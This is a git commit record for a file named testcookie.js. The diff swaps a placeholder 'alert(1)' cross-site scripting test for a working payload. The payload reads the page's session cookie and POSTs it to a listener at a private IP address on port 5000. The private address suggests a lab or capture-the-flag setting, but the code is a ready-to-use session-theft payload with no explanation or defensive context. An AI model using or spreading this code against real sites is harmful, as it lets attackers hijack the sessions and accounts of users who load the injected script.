3699745a4e88a3c2d82e7c454e93ccfa15e7c52e
zer0p0int <81251950+zer0p0intvvv@users.noreply.github.com>
2024-05-06 19:03:15 +0800

    Update testcookie.js

--- testcookie.js
+++ testcookie.js
@@ -1,1 +1,13 @@
-alert(1);
+var sessionid = document.cookie.split('=')[1]+".";
+
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://172.20.0.3:5000/send');
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    console.log(xhr.responseText);
+  }
+};
+
+xhr.send('header=fdsafdsa&listener=admin123123&content='+sessionid);
